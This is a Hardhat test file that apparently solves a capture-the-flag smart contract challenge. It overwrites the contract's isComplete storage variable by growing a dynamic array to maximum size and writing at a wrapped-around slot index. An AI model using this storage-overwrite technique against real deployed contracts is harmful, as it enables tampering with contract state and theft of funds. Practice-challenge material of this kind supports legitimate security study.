import { expect } from "chai";
import { ethers } from "hardhat";

describe("Mapping", () => {
  it("Solves the challenge", async () => {
    // deploy contract
    const contract = await ethers.deployContract("MappingChallenge");
    contract.waitForDeployment();

    // max uint to overflow array
    const MAX_UINT_256 = BigInt("2") ** BigInt("256") - BigInt("1");

    // max capacity array
    const tx = await contract.set(MAX_UINT_256 - BigInt("1"), 0);
    await tx.wait();

    // overwrite isComplete()
    const firstSLot =
      "0x0000000000000000000000000000000000000000000000000000000000000001";
    const arraySlot = BigInt(ethers.keccak256(firstSLot));

    const slots = BigInt("2") ** BigInt("256");
    const isCompleteSlot = slots - BigInt(arraySlot);
    const finalTx = await contract.set(isCompleteSlot, "1");
    await finalTx.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
